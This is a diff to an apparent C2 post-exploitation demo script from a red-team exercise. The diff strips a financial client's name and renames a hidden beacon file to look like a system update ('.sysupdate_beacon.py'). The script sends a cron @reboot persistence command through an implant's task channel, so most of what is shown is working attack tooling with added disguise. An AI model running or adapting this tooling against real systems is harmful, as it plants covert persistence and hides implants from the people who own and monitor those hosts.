@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-C2 post-exploitation demo — Meridian Financial red-team exercise.
+C2 post-exploitation demo — lab red-team exercise.
 
 Demonstrates:
   1. Session establishment — implant beacons in, server assigns a session ID
@@ -79,7 +79,7 @@ def run_task(sid: str, cmd: str, wait: float = 12.0) -> str:
 
 def demo() -> int:
     print("=" * 64)
-    print("Meridian Financial — C2 Post-Exploitation Demo")
+    print("C2 Post-Exploitation Demo")
     print("Technique: HTTP beacon + task/result channel")
     print("=" * 64)
 
@@ -138,7 +138,7 @@ def demo() -> int:
     print(DIVIDER)
     print("[Step 4] Post-exploitation — persistence via cron")
     print()
-    persist_cmd = r"(crontab -l 2>/dev/null; echo '@reboot python3 /tmp/.meridian_beacon.py') | crontab -"
+    persist_cmd = r"(crontab -l 2>/dev/null; echo '@reboot python3 /tmp/.sysupdate_beacon.py') | crontab -"
     print(f"  $ {persist_cmd}")
     out = run_task(sid, persist_cmd)
     print(f"    {out or '(success — crontab written)'}")
